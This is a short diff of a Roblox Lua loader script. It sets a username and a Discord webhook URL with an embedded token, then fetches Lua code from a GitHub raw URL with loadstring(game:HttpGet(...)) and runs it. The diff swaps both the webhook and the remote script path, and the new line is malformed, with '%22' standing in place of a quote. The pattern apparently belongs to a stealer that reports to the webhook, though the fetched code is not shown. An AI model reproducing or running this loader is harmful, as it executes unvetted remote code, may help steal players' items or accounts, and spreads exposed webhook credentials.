@@ -1,4 +1,4 @@
 UserName = "QuizyLegit"
-Webhook = "https://discord.com/api/webhooks/1089519110058164304/DBt3Gh89iUZVwd1S8P-uu3OI9cZ5V8TdDiSNlQEilBikm6meTb0bMIWcTp9uM-a-vKx8"
+Webhook = "https://discord.com/api/webhooks/1090717584174878881/5fxF27f9UHXaIFj_WGMIGqhW6GF_pmmObZiI5dwyGWkq8H6TdxRRmGSwndBvPROkrDzs"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/Rizz/main/Main.lua%22))()
